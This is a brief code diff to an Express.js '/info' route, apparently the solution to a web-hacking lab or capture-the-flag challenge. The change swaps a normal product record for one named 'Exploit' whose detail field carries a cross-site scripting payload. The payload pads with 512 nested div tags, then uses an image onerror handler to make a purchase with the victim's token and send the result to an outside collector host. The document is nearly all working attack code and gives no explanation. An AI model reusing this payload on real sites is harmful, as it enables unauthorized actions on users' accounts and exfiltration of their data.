@@ -14,9 +14,9 @@ app.get('/info', (req, res) => {
     const token = req.headers['token'];
 
     const items = {
-        "id": 1,
-        "name": "Web Hacking 강의",
-        "price": 1024,
+        "id": 5,
+        "name": "Exploit",
+        "price": 9,
         "detail": `${`<div>`.repeat(512)}${`</div>`.repeat(512)}<img src='' onerror='fetch("${url}/4/buy", {method: "POST",headers: {"Content-Type": "application/json","token": "${token}"}}).then(response => response.json()).then(data => {fetch("${rqb}/"+data.data)})'/>`,
         "poster": ""
     }
